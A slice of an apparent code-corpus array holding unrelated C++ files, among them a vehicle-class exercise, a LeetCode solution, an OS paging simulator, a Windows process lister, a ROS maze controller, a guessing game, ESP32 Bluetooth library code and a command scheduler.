aktywowa\u0107.\n * Nast\u0119pnie wykonaj odpowiednie zadania.\n */\n\n/* Zadanie 1\n * Zaimplementuj brakuj\u0105ce funkcje i konstruktory. Zapoznaj si\u0119 z b\u0142\u0119dami, jakie pokazuje kompilator aby uzyska\u0107\n * wskaz\u00f3wki.\n */\n#define ENABLE_TASK_1 0\n\n/* Zadanie 2\n * Zaimplementuj brakuj\u0105ce funkcje i konstruktory. Zapoznaj si\u0119 z b\u0142\u0119dami, jakie pokazuje kompilator aby uzyska\u0107\n * wskaz\u00f3wki.\n */\n#define ENABLE_TASK_2 0\n\n/* Zadanie 3\n * Zaimplementuj brakuj\u0105ce funkcje i konstruktory. Zapoznaj si\u0119 z b\u0142\u0119dami, jakie pokazuje kompilator aby uzyska\u0107\n * wskaz\u00f3wki.\n */\n#define ENABLE_TASK_3 0\n\nauto runime_assert_msg(auto given, auto expected, auto line) -> void\n{\n    if (given != expected)\n    {\n        std::print(\"Abort at line {} with {} != {}\\n\", line, given, expected);\n        abort();\n    }\n}\n\nint main()\n{\n    Vehicle v1(\"Unknown\", 4, 4, 0);\n\n    Starship s1(\"USS Enterprise NX-01\", 0, 0, 0);\n\n    Automobile a1(\"Automobile concept\", 4, 2, 1, true);\n\n    Bike b1(\"Gazelle Arroyo C5\", 2);\n\n    runime_assert_msg(v1.get_doors(), 4, __LINE__);\n    runime_assert_msg(b1.get_doors(), 0, __LINE__);\n\n    Car c1(\"Classic car\", 4, 2, 1, true);\n\n#if ENABLE_TASK_1\n    Truck truck_1(\"MAN TGX\", 16, 2, 4);\n    runime_assert_msg(truck_1.get_doors(), 2, __LINE__);\n    runime_assert_msg(truck_1.get_wheels(), 16, __LINE__);\n    runime_assert_msg(truck_1.get_color(), 4, __LINE__);\n#endif\n\n#if ENABLE_TASK_2\n    ElectricCar electric_car_1(\"Tesla S\", 4, 4);\n    runime_assert_msg(electric_car_1.get_doors(), 4, __LINE__);\n    runime_assert_msg(electric_car_1.get_wheels(), 4, __LINE__);\n    runime_assert_msg(electric_car_1.get_color(), 4, __LINE__);\n    runime_assert_msg(electric_car_1.has_automatic_gear(), true, __LINE__);\n#endif\n\n#if ENABLE_TASK_3\n    HybridCar hybrid_1(\"Hybryda\", 4, 4);\n    // runime_assert_msg(hybrid_1.get_doors(), 4, __LINE__);\n    // runime_assert_msg(hybrid_1.get_wheels(), 4, __LINE__);\n    // runime_assert_msg(hybrid_1.get_color(), 4, __LINE__);\n    // runime_assert_msg(hybrid_1.has_automatic_gear(), true, __LINE__);\n#endif\n}\n",
    "class Solution {\r\npublic:\r\n    int longestPalindrome(string s) {\r\n     \r\n       \r\n    //    vector<int>hash1(26,0);\r\n\r\n    //    for(int i=0;i<s.size();i++){\r\n    //         char ch=s[i]-'a';\r\n    //      hash1[ch]++;\r\n\r\n    //    }\r\n    //   vector<int>hash2(26,0);\r\n         \r\n    //     for(int i=0;i<s.size();i++){\r\n    //         char ch=s[i]-'A';\r\n    //         hash2[ch]++;\r\n\r\n    //     }\r\n\r\n    // Better Approach to store\r\n\r\n    vector<int>lower(26,0);\r\n    vector<int>upper(26,0);\r\n\r\n    // Frequency Update\r\n    for(int i=0;i<s.size();i++){\r\n        if(s[i]>='a')\r\n        lower[s[i]-'a']++;\r\n             \r\n             else\r\n             upper[s[i]-'A']++;\r\n\r\n    }\r\n                 \r\n                 int count =0;bool odd =0;\r\nfor(int i=0;i<26;i++){\r\n      if(lower[i]%2==0)\r\n      count+=lower[i];\r\n\r\n      else{\r\n      count+=lower[i]-1;\r\nodd=1;;}\r\n      if(upper[i]%2==0)\r\n      count+=upper[i];\r\n      else{\r\n      count+=upper[i]-1;\r\n         odd=1;\r\n         }\r\n\r\n}\r\n\r\n return count+odd;\r\n\r\n    }\r\n};",
    "// Phase-II\n#include <bits/stdc++.h>\nusing namespace std;\nint IC[2], VA, RA, PTR[4], EM=0, pi=0,si=0, ti=0;\nstring M[300][4], R[4], IR[4], buff;\nbool C;\nstruct PCB{\n    int job_id[4];\n    int TTC[4];\n    int LLC[4];\n    int TTL[4];\n    int TLL[4];\n}p1;\n\nifstream myfile;\nofstream myWf;\n\nvoid load();\nvoid init();\nvoid startExecution();\nvoid MOS(int);\nvoid READ();\nvoid WRITE();\nvoid TERMINATE(int);\nvoid executeUserProgram();\nint ALLOCATE();\nvoid ADDRESS_MAP(int);\nvoid SIMULATION();\n\nvoid init()\n{\n    srand(time(0));\n    for (int i = 0; i < 300; i++){\n        for (int j = 0; j < 4; j++){\n            M[i][j] = \"*\";\n        }\n    }\n    for (int i = 0; i < 4; i++){\n        R[i] = \"*\";\n        IR[i] = \"*\";\n        PTR[i] = 0;\n    }\n    IC[0] = 0;\n    IC[1] = 0;\n    C = false;\n    EM=0;\n    ti=0;\n    si=0;\n    pi=0;\n}\n\nvoid load()\n{\n    int prgmc=0;\n    while (getline(myfile, buff)){\n        string s = buff.substr(0, 4);\n        if (s == \"$AMJ\"){\n            init();\n            for(int i=0;i<4;i++){\n                p1.job_id[i]=stoi(buff.substr(i+4,1));\n                p1.TTL[i]=stoi(buff.substr(i+8,1));\n                p1.TLL[i]=stoi(buff.substr(i+12,1));\n            }\n            for(int i=0;i<4;i++){\n                p1.TTC[i]=0;\n                p1.LLC[i]= 0; \n            }\n\n            //PCB for checking results\n            cout<<\"\\njob_id :: \";\n            for(int i=0;i<4;i++)\n                cout<<p1.job_id[i];\n            cout<<\"\\nTTL :: \";\n            for(int i=0;i<4;i++)\n                cout<<p1.TTL[i];\n            cout<<\"\\nTLL :: \";\n            for(int i=0;i<4;i++)\n                cout<<p1.TLL[i];\n            cout<<\"\\nTTC :: \";\n            for(int i=0;i<4;i++)\n                cout<<p1.TTC[i];\n            cout<<\"\\nLLC :: \";\n            for(int i=0;i<4;i++)\n                cout<<p1.LLC[i];\n\n            if(p1.TTL[3]==0 && p1.TTL[2]==0 &&p1.TTL[1]==0 && p1.TTL[0]==0)\n                TERMINATE(3);\n\n            int randint=ALLOCATE();\n            randint=randint*10;\n\n            int ptrassist=randint;\n            for(int i=0;i<10;i++){\n                for(int j=0;j<4;j++){\n                    M[randint][j]=\"#\";\n                }\n                randint++;\n            }\n            for(int i=3;i>=0;i--){\n                    PTR[i]=ptrassist%10;\n                    \n                    ptrassist=ptrassist/10;\n            }\n\n            //PTR Initiat\n            cout<<\"\\n\\nPTR :: \";\n            for(int i=0;i<4;i++){\n                cout<< PTR[i];\n            }\n            cout << endl;\n        }\n    \n        else if(s==\"$DTA\"){\n            startExecution();\n        }\n        else if (s == \"$END\")\n        {\n            prgmc=0;\n            cout << \"\\nend of job\" << endl;\n            cout << \"----------------------------------------------------\"<< endl;\n        }\n        else if (s!=\"$AMJ\" && s!=\"$DTA\" && s != \"$END\"){\n            int PTRint=PTR[3]+PTR[2]*10+PTR[1]*100+PTR[0]*1000+prgmc;\n            \n            int Pframe=ALLOCATE();\n            \n            for(int i=3;i>=0;i--){\n                M[PTRint][i]=Pframe%10+48;\n                Pframe=Pframe/10;\n            }\n            \n            int p=(stoi(M[PTRint][3])+stoi(M[PTRint][2])*10+stoi(M[PTRint][1])*100+stoi(M[PTRint][0])*1000)*10;\n\n            int j=0;\n            if(buff.size()>40){\n                cout << \"\\nProgram card exceeded limit - 40 bytes\";\n                exit(0);\n            }\n            for (int i = 0; i < buff.size(); i++)\n            {\n                if(j==4){\n                    j=0;\n                    p++;\n                }\n                if(buff[i]=='H'){\n                    int k=1;\n                    M[p][j]=buff[i];\n                    for(k=1;k<=3;k++){\n                        M[p][k]='*';\n                    }\n                    j=k-1;\n                }\n                else \n                    M[p][j]=buff[i];\n                j++;\n            }\n            prgmc++;\n        }\n        else{\n            exit (0);\n        }\n    }\n    exit(0);\n}\n\nint ALLOCATE(){\n    int randint;\n    randint = rand() % 30;\n    return randint;\n}\n\nvoid ADDRESS_MAP(int VA){\n    int PTRint=PTR[3]+PTR[2]*10+PTR[1]*100+PTR[0]*1000;\n    int PTE=PTRint+VA/10;\n\n    //Valid & Invalid\n    if(M[PTE][2]+M[PTE][3]==\"##\"){\n       pi=3;\n       if(IR[0]+IR[1]==\"GD\" || IR[0]+IR[1]==\"SR\"){\n            int validframe=ALLOCATE();\n            for(int i=3;i>=0;i--){\n                M[PTE][i]=validframe%10+48;\n                validframe=validframe/10;\n            }\n            SIMULATION();\n       }\n       else if(IR[0]+IR[1]==\"PD\" || IR[0]+IR[1]==\"LR\" || IR[0]+IR[1]==\"SR\" || IR[0]+IR[1]==\"CR\" || IR[0]+IR[1]==\"BT\"){\n            TERMINATE(6);\n       }\n       else{\n            pi=1;\n            TERMINATE(4);\n       }\n       pi=0;\n    }\n    int p=stoi(M[PTE][3])+stoi(M[PTE][2])*10;\n    RA=p*10+VA%10;\n    \n}\n\nvoid SIMULATION(){\n    if(p1.TTC[3]==9){\n        p1.TTC[2]+=1;\n        p1.TTC[3]=0;\n    }\n    else{\n        p1.TTC[3]+=1;\n    }\n    \n    if(p1.TTC[3]>=p1.TTL[3] && p1.TT",
    "\ufeff// d4en6.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <windows.h>\n#include <tlhelp32.h>\n#include <psapi.h>\n#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <iomanip>\n#include <filesystem>\n#include <future>\n#include <chrono> \n#include <atomic> \n#include <sstream>\n#include <wincrypt.h>\n\n\nstruct ProcessInfo {\n    DWORD pid;\n    std::wstring name;\n    std::string path;\n    SIZE_T memoryUsage;\n};\n\n\nstd::vector<ProcessInfo> getProcessList() {\n    std::vector<ProcessInfo> processes;\n\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u043d\u0438\u043c\u043e\u043a \u0432\u0441\u0435\u0445 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0432\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnapshot == INVALID_HANDLE_VALUE) {\n        std::cerr << \"Error creating snapshot: \" << GetLastError() << std::endl;\n        return processes;\n    }\n\n    PROCESSENTRY32 pe32;\n    pe32.dwSize = sizeof(PROCESSENTRY32);\n\n    if (!Process32First(hSnapshot, &pe32)) {\n        std::cerr << \"Error getting first process: \" << GetLastError() << std::endl;\n        CloseHandle(hSnapshot);\n        return processes;\n    }\n\n    do {\n        ProcessInfo info;\n        info.pid = pe32.th32ProcessID;\n        info.name = pe32.szExeFile;\n\n        \n        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, info.pid);\n        if (hProcess != NULL) {\n            \n            char filePath[MAX_PATH];\n            if (GetModuleFileNameExA(hProcess, NULL, filePath, MAX_PATH) != 0) {\n                info.path = filePath;\n            }\n            \n            PROCESS_MEMORY_COUNTERS_EX pmc;\n            if (GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc))) {\n                info.memoryUsage = pmc.PrivateUsage;\n            }\n\n            CloseHandle(hProcess);\n        }\n\n        processes.push_back(info);\n    } while (Process32Next(hSnapshot, &pe32));\n\n    CloseHandle(hSnapshot);\n\n    return processes;\n}\n\nint main() {\n    \n    std::vector<ProcessInfo> processes = getProcessList();\n\n    \n    for (const auto& process : processes) {\n        \n        std::wcout << L\"PID: \" << process.pid << L\", Name: \" << process.name << L\", \";\n        std::cout << \"Path: \" << process.path;\n        std::wcout << L\", Memory Usage: \" << process.memoryUsage << L\" bytes\" << std::endl;\n\n    }\n\n    return 0;\n}\n",
    "#include \"ros/ros.h\"\n#include \"path_finding.hpp\"\n#include \"const_labyrinth.hpp\"\n#include \"AMPER/MoveAction.h\"\n#include \"actionlib/client/simple_action_client.h\"\n\n\nconst std::tuple<size_t, size_t> START_POS(10, 1);\nconst std::tuple<size_t, size_t> END_POS(2, 7);\n\nvoid sendMoveGoal(actionlib::SimpleActionClient<AMPER::MoveAction>& client, AMPER::MoveGoal goal) {\n    std::stringstream ss;\n    ss << \"Controller: Sending goal to navigation server: (is_turn=\" << (goal.is_turn_action ? '1' : '0') <<\", dis=\" << goal.distance << \", angle=\" << goal.angle << \")\";\n    std::string s = ss.str();\n    const char* cs = s.c_str();\n    ROS_INFO(cs);\n\n    client.sendGoal(goal);\n\n    bool finished = client.waitForResult(ros::Duration(100)); // arbitrary timeout\n\n    if (!finished) {\n        throw std::runtime_error(\"Timeout during navigation server action call\");\n    }\n\n    if (!client.getResult()->success) {\n        throw std::runtime_error(\"Navigation server returned error\");\n    }\n}\n\nvoid moveForward(actionlib::SimpleActionClient<AMPER::MoveAction>& client) {\n    AMPER::MoveGoal goal;\n    goal.is_turn_action = false;\n    goal.distance = 1.0;\n    goal.angle = 0.0;\n\n    sendMoveGoal(client, goal);\n}\n\n// If left==false, then it will turn right\nvoid turn(actionlib::SimpleActionClient<AMPER::MoveAction>& client, bool left) {\n    AMPER::MoveGoal goal;\n    goal.is_turn_action = true;\n    goal.distance = 0.0;\n\n    if (left) {\n        goal.angle = 90.0;\n    } else {\n        goal.angle = -90.0;\n    }\n\n    sendMoveGoal(client, goal);\n}\n\nenum Direction {\n    X_POS = 0,\n    Y_NEG = 1,\n    X_NEG = 2,\n    Y_POS = 3,\n};\n\nvoid turnToDirection(actionlib::SimpleActionClient<AMPER::MoveAction>& client, Direction currentDirection, Direction targetDirection) {\n    if (currentDirection == targetDirection) {\n        return;\n    }\n\n\n\n    if (static_cast<Direction>((currentDirection + 1) % 4) == targetDirection) {\n        turn(client, false); // turn right\n    } else if (static_cast<Direction>(currentDirection == (targetDirection + 1) % 4)) {\n        turn(client, true); // turn left\n    } else {\n\t// u turn\n        AMPER::MoveGoal goal;\n        goal.is_turn_action = true;\n        goal.distance = 0.0;\n        goal.angle = 180.0;\n\n\tsendMoveGoal(client, goal);\n    }\n}\n\n\nint main(int argc, char** argv) {\n    ros::init(argc, argv, \"robot_controller\");\n    ROS_INFO(\"Started controller\");\n\n    actionlib::SimpleActionClient<AMPER::MoveAction> client(\"MoveServer\", true);\n    client.waitForServer();\n\n\n    if (START_POS == END_POS) {\n        ROS_WARN(\"Cannot calculate path because robot start and end positions are equal\");\n        return 0;\n    }\n\n    Path path = findPath(LABYRINTH, START_POS, END_POS);\n\n    PathNode startNode = path.popNode();\n\n    std::tuple<size_t, size_t> currentPosition = {startNode.x, startNode.y};\n    Direction currentDirection = Direction::X_POS;\n\n    while (path.size() > 0) {\n        PathNode next = path.popNode();\n\n        std::stringstream ss;\n        ss << \"Next path node: (\" << next.x << ',' << next.y << ')';\n        std::string s = ss.str();\n        const char* cs = s.c_str();\n        ROS_INFO(cs);\n\n        size_t currentX = std::get<0>(currentPosition);\n        size_t currentY = std::get<1>(currentPosition);\n\n        Direction targetDirection;\n        if (currentX == next.x && currentY == next.y + 1) {\n            targetDirection = Direction::Y_NEG;\n        } else if (currentX == next.x && currentY + 1 == next.y) {\n            targetDirection = Direction::Y_POS;\n        } else if (currentY == next.y && currentX == next.x + 1){\n            targetDirection = Direction::X_NEG;\n        } else if (currentY == next.y && currentX + 1 == next.x){\n            targetDirection = Direction::X_POS;\n        } else {\n            throw std::runtime_error(\"Invalid path\");\n        }\n\n        turnToDirection(client, currentDirection, targetDirection);\n        currentDirection = targetDirection;\n\tcurrentPosition = {next.x, next.y};\n\n        moveForward(client);\n    }\n\n    ros::spin();\n    return 0;\n}\n\n",
    "#include<bits/stdc++.h>\r\n#include<conio.h>\r\nusing namespace std;\r\nint ranNumberGen()\r\n{\r\n    int lower = 1, upper=10;\r\n    srand(time(0)); // for generating each and every unique number \r\n    int number = (rand() % (upper-lower))+ lower;\r\n    return number;\r\n}\r\n\r\n\r\nbool checkGuessNumber(int ranNumber)\r\n{\r\n    int count = 3 ; // number of chances \r\n    bool check = false;\r\n    int guessNum;\r\n    while(count --)\r\n    {\r\n        cout<<\"ENTER THE NUMBER(Range from 1 to 10) : \"<<flush;\r\n        cin>>guessNum;\r\n\r\n\r\n        if(ranNumber == guessNum) // check guess Number is correct or not \r\n        {\r\n            return true;\r\n        }else{\r\n                if(count != 0)\r\n                {\r\n                    if(guessNum < ranNumber){\r\n                    system(\"cls\");\r\n                    cout<<\"Enter too High Number\"<<endl;\r\n                    \r\n                      } else {\r\n                    system(\"cls\");\r\n                    cout<<\"Enter Too Low Number\"<<endl;\r\n                   \r\n                     }\r\n                }\r\n\r\n        } \r\n    } // while loop end;\r\n    return false;\r\n    \r\n}\r\nint main()\r\n{\r\nlevel:\r\n    system(\"cls\");\r\n    int ranNumber = ranNumberGen();\r\n    bool check =   checkGuessNumber(ranNumber);\r\n    if(check)\r\n    {\r\n        system(\"cls\");\r\n        cout<<\"Congratulations!\\t You Won The Game\"<<endl;\r\n        cout<<\"Press \\\"ZERO\\\" to Exit.. else Play \\\"Again\\\"\"<<endl;\r\n        bool n;\r\n        cin>>n;\r\n        getch();\r\n        if(n) goto level; else exit(0);\r\n    }else{\r\n        system(\"cls\");\r\n        cout<<\"Sorry!\"<<endl<<\" You Lost The Game Try Again\"<<endl<<endl;\r\n        cout<<\"Press \\\"ZERO\\\" to Exit.. else Play \\\"Again\\\"\"<<endl;\r\n        bool n;\r\n        cin>>n;\r\n        getch();\r\n        if(n) goto level; else exit(0);\r\n    }\r\n    \r\n}",
    "// Copyright 2018 Evandro Luis Copercini\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"sdkconfig.h\"\n#include <cstdint>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include \"freertos/FreeRTOS.h\"\n#include \"freertos/task.h\"\n\n#if defined(CONFIG_BT_ENABLED) && defined(CONFIG_BLUEDROID_ENABLED)\n\n#ifdef ARDUINO_ARCH_ESP32\n#include \"esp32-hal-log.h\"\n#endif\n\n#include \"BluetoothSerial.h\"\n#include \"BTAdvertisedDevice.h\"\n\n#include \"esp_bt.h\"\n#include \"esp_bt_main.h\"\n#include \"esp_gap_bt_api.h\"\n#include \"esp_bt_device.h\"\n#include \"esp_spp_api.h\"\n#include <esp_log.h>\n\n#include \"esp32-hal-log.h\"\n\nconst char *_spp_server_name = \"ESP32SPP\";\n\n#define RX_QUEUE_SIZE         512\n#define TX_QUEUE_SIZE         32\n#define SPP_TX_QUEUE_TIMEOUT  1000\n#define SPP_TX_DONE_TIMEOUT   1000\n#define SPP_CONGESTED_TIMEOUT 1000\n\nstatic uint32_t _spp_client = 0;\nstatic QueueHandle_t _spp_rx_queue = NULL;\nstatic QueueHandle_t _spp_tx_queue = NULL;\nstatic SemaphoreHandle_t _spp_tx_done = NULL;\nstatic TaskHandle_t _spp_task_handle = NULL;\nstatic EventGroupHandle_t _spp_event_group = NULL;\nstatic EventGroupHandle_t _bt_event_group = NULL;\nstatic boolean secondConnectionAttempt;\nstatic esp_spp_cb_t custom_spp_callback = NULL;\nstatic BluetoothSerialDataCb custom_data_callback = NULL;\nstatic esp_bd_addr_t current_bd_addr;\nstatic ConfirmRequestCb confirm_request_callback = NULL;\nstatic KeyRequestCb key_request_callback = NULL;\nstatic AuthCompleteCb auth_complete_callback = NULL;\nstatic bool _rmt_name_valid = false;\nstatic uint8_t _rmt_name[ESP_BT_GAP_MAX_BDNAME_LEN + 1] = {0};\n\n#define INQ_LEN       0x10\n#define INQ_NUM_RSPS  20\n#define READY_TIMEOUT (10 * 1000)\n#define SCAN_TIMEOUT  (INQ_LEN * 2 * 1000)\nstatic esp_bd_addr_t _peer_bd_addr;\nstatic char _remote_name[ESP_BT_GAP_MAX_BDNAME_LEN + 1];\nstatic bool _isRemoteAddressSet;\nstatic bool _isMaster;\n#ifdef CONFIG_BT_SSP_ENABLED\nstatic bool _enableSSP;\nstatic bool _IO_CAP_INPUT;\nstatic bool _IO_CAP_OUTPUT;\n#endif\nesp_bt_pin_code_t _pin_code = {0};\nuint8_t _pin_code_len = 0;  // Number of valid Bytes in the esp_bt_pin_code_t array\nstatic esp_spp_sec_t _sec_mask;\nstatic esp_spp_role_t _role;\n// start connect on ESP_SPP_DISCOVERY_COMP_EVT or save entry for getChannels\nstatic bool _doConnect;\nstatic std::map<int, std::string> sdpRecords;\n\nstatic BTScanResultsSet scanResults;\nstatic BTAdvertisedDeviceCb advertisedDeviceCb = nullptr;\n\n// _spp_event_group\n#define SPP_RUNNING   0x01\n#define SPP_CONNECTED 0x02\n#define SPP_CONGESTED 0x04\n// true until OPEN successful, changes to false on CLOSE\n#define SPP_DISCONNECTED 0x08\n// true until connect(), changes to true on CLOSE\n#define SPP_CLOSED 0x10\n\n// _bt_event_group\n#define BT_DISCOVERY_RUNNING   0x01\n#define BT_DISCOVERY_COMPLETED 0x02\n\n#define BT_SDP_RUNNING   0x04\n#define BT_SDP_COMPLETED 0x08\n\ntypedef struct {\n  size_t len;\n  uint8_t data[];\n} spp_packet_t;\n\n#if (ARDUHAL_LOG_LEVEL >= ARDUHAL_LOG_LEVEL_INFO)\nstatic char *bda2str(esp_bd_addr_t bda, char *str, size_t size) {\n  if (bda == NULL || str == NULL || size < 18) {\n    return NULL;\n  }\n\n  uint8_t *p = bda;\n  snprintf(str, size, \"%02x:%02x:%02x:%02x:%02x:%02x\", p[0], p[1], p[2], p[3], p[4], p[5]);\n  return str;\n}\n#endif\n\nstatic bool get_name_from_eir(uint8_t *eir, char *bdname, uint8_t *bdname_len) {\n  if (!eir || !bdname || !bdname_len) {\n    return false;\n  }\n\n  uint8_t *rmt_bdname, rmt_bdname_len;\n  *bdname = *bdname_len = rmt_bdname_len = 0;\n\n  rmt_bdname = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_CMPL_LOCAL_NAME, &rmt_bdname_len);\n  if (!rmt_bdname) {\n    rmt_bdname = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_SHORT_LOCAL_NAME, &rmt_bdname_len);\n  }\n  if (rmt_bdname) {\n    rmt_bdname_len = rmt_bdname_len > ESP_BT_GAP_MAX_BDNAME_LEN ? ESP_BT_GAP_MAX_BDNAME_LEN : rmt_bdname_len;\n    memcpy(bdname, rmt_bdname, rmt_bdname_len);\n    bdname[rmt_bdname_len] = 0;\n    *bdname_len = rmt_bdname_len;\n    return true;\n  }\n  return false;\n}\n\nstatic esp_err_t _spp_queue_packet(uint8_t *data, size_t len) {\n  if (!data || !len) {\n    log_w(\"No data provided\");\n    return ESP_OK;\n  }\n  spp_packet_t *packet = (spp_packet_t *)malloc(sizeof(spp_packet_t) + len);\n  if (!packet) {\n    log_e(\"SPP TX Packet Malloc Failed!\");\n    return ESP_FAIL;\n  }\n  packet->len = len;\n  memcpy(packet->data, data, len);\n  if (!_spp_tx_queue || xQueueSend(_spp_tx_queue, &packet, SPP_TX_QUEUE_TIMEOUT) != pdPASS) {\n    log_e(\"SPP TX Queue Send Failed!\");\n    free(packet);\n    return ESP_FAIL;\n  }\n  retu",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <vector>\r\n#include <cstring>\r\n#include <thread>\r\n#include <algorithm>\r\n#include <chrono>\r\n#include <mutex>\r\n#include <exception>\r\n#include <stdexcept>\r\n#include <functional>\r\n#include <numeric>\r\n#include <future>\r\n#include <atomic>\r\n\r\nusing namespace std;\r\n#pragma warning(disable:4996)\r\n\r\n// \ub9ac\uc2a4\ud2b8 \ub178\ub4dc \uad6c\uc870\uccb4\r\nstruct ListNode {\r\n    function<void()> process;\r\n    ListNode* next;\r\n    bool isBackground;\r\n    ListNode(function<void()>&& proc, bool bg) : process(move(proc)), next(nullptr), isBackground(bg) {}\r\n};\r\n\r\n// \uc2a4\ud0dd \ub178\ub4dc \uad6c\uc870\uccb4 \uc815\uc758\r\nstruct StackNode {\r\n    StackNode* next;\r\n    ListNode* list;\r\n\r\n    StackNode() : next(nullptr), list(nullptr) {}\r\n};\r\n\r\n// \ud568\uc218 \uc120\uc5b8\r\nchar** parse(const string& command);\r\nvoid exec(char** args, const string& original_command);\r\nvoid echo(const vector<string>& args, int period, int timeout);\r\nvoid dummy(int count);\r\nint gcd(int a, int b);\r\nvoid prime(int x);\r\nvoid sum(int x, int m);\r\nvoid enqueue(function<void()>&& process, bool isForeground, const string& original_command);\r\nvoid dequeue();\r\nvoid promote();\r\nvoid split_n_merge(StackNode* stack_node);\r\n\r\n// \uc804\uc5ed \ubcc0\uc218\r\nStackNode* stack = new StackNode();\r\nStackNode* stack_top = stack;\r\nStackNode* P = stack;\r\nmutex stack_mutex;  // \uc2a4\ud0dd \uc811\uadfc\uc744 \uc704\ud55c \ubba4\ud14d\uc2a4\r\nmutex print_mutex;  // \ucd9c\ub825 \ubcf4\ud638\ub97c \uc704\ud55c \ubba4\ud14d\uc2a4\r\n\r\nconst int THRESHOLD = 5;  // \uc784\uacc4\uce58 (\uc608\uc2dc)\r\natomic<int> background_process_count(0);  // \ubc31\uadf8\ub77c\uc6b4\ub4dc \ud504\ub85c\uc138\uc2a4 \uac1c\uc218\ub97c \uc800\uc7a5\ud558\ub294 \ubcc0\uc218\r\n\r\n// \ubc31\uadf8\ub77c\uc6b4\ub4dc \uc791\uc5c5\uc790 \ud568\uc218\r\nvoid background_worker() {\r\n    while (true) {\r\n        this_thread::sleep_for(chrono::seconds(1));\r\n        if (background_process_count > 0) {\r\n            dequeue();\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    // \ubc31\uadf8\ub77c\uc6b4\ub4dc \uc791\uc5c5\uc790 \uc2a4\ub808\ub4dc\ub97c \uc2dc\uc791\r\n    thread bg_worker(background_worker);\r\n    bg_worker.detach();\r\n\r\n    ifstream file(\"command.txt\");\r\n    if (!file.is_open()) {\r\n        cerr << \"Failed to open file\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    string line;\r\n    while (getline(file, line)) {\r\n        try {\r\n            stringstream ss(line);\r\n            string segment;\r\n            while (getline(ss, segment, ';')) {\r\n                segment = segment.substr(0, segment.find_last_not_of(\" \\t\\n\\r\\f\\v\") + 1); // Trim trailing whitespace\r\n                char** parsed_command = parse(segment);\r\n                exec(parsed_command, segment);\r\n                for (int i = 0; parsed_command[i][0] != '\\0'; i++) {\r\n                    delete[] parsed_command[i];\r\n                }\r\n                delete[] parsed_command;\r\n            }\r\n            promote();  // \ud504\ub85c\uc138\uc2a4 \ud6c4 promote \uc218\ud589\r\n            split_n_merge(stack);  // \ud504\ub85c\uc138\uc2a4 \ud6c4 split and merge \uc218\ud589\r\n        }\r\n        catch (const exception& e) {\r\n            lock_guard<mutex> lock(print_mutex);\r\n            cerr << \"Exception occurred: \" << e.what() << endl;\r\n        }\r\n    }\r\n    file.close();\r\n\r\n    // \ud504\ub85c\uc138\uc2a4\ub4e4\uc744 \uc2e4\ud589\r\n    while (stack_top != nullptr && stack_top->list != nullptr) {\r\n        dequeue();\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n// \uba85\ub839\uc5b4\ub97c \ud30c\uc2f1\ud558\ub294 \ud568\uc218\r\nchar** parse(const string& command) {\r\n    istringstream stream(command);\r\n    vector<string> tokens;\r\n    string token;\r\n    while (stream >> token) {\r\n        tokens.push_back(token);\r\n    }\r\n    char** tokens_array = new char* [tokens.size() + 1];\r\n    for (size_t i = 0; i < tokens.size(); ++i) {\r\n        tokens_array[i] = new char[tokens[i].size() + 1];\r\n        strcpy(tokens_array[i], tokens[i].c_str());\r\n    }\r\n    tokens_array[tokens.size()] = new char[1];\r\n    tokens_array[tokens.size()][0] = '\\0';\r\n    return tokens_array;\r\n}\r\n\r\n// \uba85\ub839\uc5b4\ub97c \uc2e4\ud589\ud558\ub294 \ud568\uc218\r\nvoid exec(char** args, const string& original_command) {\r\n    if (args[0][0] == '\\0') return;\r\n    string command = args[0];\r\n    bool isBackground = false;\r\n    if (command[0] == '&') {\r\n        isBackground = true;\r\n        command = command.substr(1);\r\n    }\r\n\r\n    vector<string> arguments;\r\n    for (int i = 1; args[i][0] != '\\0'; i++) {\r\n        arguments.push_back(args[i]);\r\n    }\r\n\r\n    int repeat = 1;\r\n    int timeout = 100;\r\n    int period = 1;\r\n    int m = 1;\r\n\r\n    // handle_options \ud568\uc218 \ub0b4\uc6a9\r\n    for (size_t i = 0; i < arguments.size(); ++i) {\r\n        if (arguments[i] == \"-n\" && i + 1 < arguments.size()) {\r\n            repeat = stoi(arguments[i + 1]);\r\n            arguments.erase(arguments.begin() + i, arguments.begin() + i + 2);\r\n            --i;\r\n        }\r\n        else if (arguments[i] == \"-d\" && i + 1 < arguments.size()) {\r\n            timeout = stoi(arguments[i + 1]);\r\n            arguments.erase(arguments.begin() + i, arguments.begin() + i + 2);\r\n            --i;\r\n        }\r\n        else if (arguments[i] == \"-p\" && i + 1 < arguments.size()) {\r\n            period = stoi(arguments[i + 1]);\r\n            arguments.erase(arguments.begin() + i, arguments.begin() + i + 2);\r\n            --i;\r\n        }\r\n        else if (arguments[i] == \"-m\" && i + 1 < arguments.size()) {\r\n            m = stoi(arguments[i + 1]);\r\n            arguments.erase(arguments.begin() + i, arguments.begin() + i + 2);\r\n            --i;\r\n        }\r\n    }\r\n\r\n    for (in",
